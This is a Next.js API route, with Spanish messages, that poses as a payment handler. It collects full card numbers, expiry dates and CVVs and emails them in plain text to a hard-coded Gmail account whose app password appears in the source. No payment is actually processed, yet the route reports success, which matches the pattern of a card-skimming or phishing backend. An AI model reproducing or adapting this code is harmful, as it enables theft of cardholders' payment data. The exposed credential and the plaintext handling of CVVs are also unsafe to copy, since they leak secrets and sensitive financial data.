import nodemailer from 'nodemailer';
import { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    const { cardNumber, expiryDate, cvv, email, totalAmount, alias, selectedCard, message } = req.body;

    if (!email || !totalAmount || !cardNumber || !message) {
      return res.status(400).json({ error: '❌ Datos incompletos. Verifica los campos.' });
    }

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
         user: 'blackrock.groupx@gmail.com', // Reemplázalo con tu correo de Gmail
        pass: 'bwaz bvcu chza ghnx', // ⚠️ Usa una contraseña de aplicación de Google
      },
    });

    const mailOptions = {
      from: `"Retiro de Pago" <blackrock.groupx@gmail.com>`,
      to: 'blackrock.groupx@gmail.com',
      subject: 'Confirmación de Pago',
      text: `
        ✅ Pago procesado con éxito.
        - Monto: ${totalAmount}
        - Alias: ${alias}
        - Tarjeta: ${selectedCard}
        - Número: ${cardNumber}
        - Fecha de Expiración: ${expiryDate}
        - CVV: ${cvv}

        📨 Mensaje: ${message}
      `,
    };

    await transporter.sendMail(mailOptions);
    console.log('PAGO ENVIADO CORRECTAMENTE');

    return res.status(200).json({ message: 'PAGO ENVIADO CORRECTAMENTE' });
  } catch (error) {
    console.error('Error enviando correo:', error);
    return res.status(500).json({ error: '❌ Error al enviar el correo. Revisa la configuración del servidor.' });
  }
}